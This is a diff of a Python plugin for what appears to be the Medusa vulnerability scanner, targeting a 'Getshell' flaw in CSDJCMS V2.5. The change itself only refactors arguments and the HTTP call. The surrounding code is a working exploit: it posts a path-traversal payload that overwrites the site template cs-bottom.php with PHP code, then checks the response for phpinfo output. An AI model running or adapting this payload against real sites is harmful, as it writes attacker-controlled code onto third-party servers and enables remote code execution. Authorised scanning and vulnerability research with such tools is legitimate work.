@@ -20,7 +20,7 @@ class VulnerabilityInfo(object):
         self.info['version'] = "CSDJCMS(程氏舞曲管理系统)V2.5"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
-def medusa(Url,RandomAgent,Token,proxies=None):
+def medusa(Url,RandomAgent,proxies=None,**kwargs):
     proxies=Proxies().result(proxies)
     scheme, url, port = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
@@ -45,13 +45,12 @@ def medusa(Url,RandomAgent,Token,proxies=None):
             "Content-Length": "169"
         }
         data = "FileName=cs-bottom.php&content=%3C%3Fphp+phpinfo+%3F%3E&folder=..%2Fskins%2Findex%2Fhtml%2F&tempname=%C4%AC%C8%CF%C4%A3%B0%E6&Submit=%D0%DE%B8%C4%B5%B1%C7%B0%C4%A3%B0%E5"
-        s = requests.session()
-        resp = s.post(payload_url, data=data,headers=headers,proxies=proxies, timeout=6, verify=False)
+        resp = requests.post(payload_url, data=data,headers=headers,proxies=proxies, timeout=6, verify=False)
         con = resp.text
         if con.find('PHP Version') != -1 and con.find('System') !=-1 and con.find('Configure Command') != -1:
             Medusa = "{}存在CSDJCMSGetshell\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url, payload_url, con)
             _t = VulnerabilityInfo(Medusa)
-            VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
+            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
